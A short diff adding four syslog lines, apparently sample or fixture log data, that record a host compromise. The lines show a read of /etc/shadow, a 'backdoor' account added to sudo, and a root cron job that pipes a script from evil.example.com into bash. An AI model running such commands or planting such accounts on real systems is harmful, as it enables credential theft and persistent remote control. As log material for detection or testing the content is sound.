@@ -1,0 +1,4 @@
+Jul 18 10:00:00 web-prod-01 sudo: deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/bin/cat /etc/shadow
+Jul 18 10:05:00 web-prod-01 useradd[2200]: new user: name=backdoor, UID=1050, GID=1050, home=/home/backdoor, shell=/bin/bash
+Jul 18 10:06:00 web-prod-01 usermod[2201]: add 'backdoor' to group 'sudo'
+Jul 18 10:10:00 web-prod-01 CRON[2300]: (root) CMD (curl http://evil.example.com/payload.sh | bash)
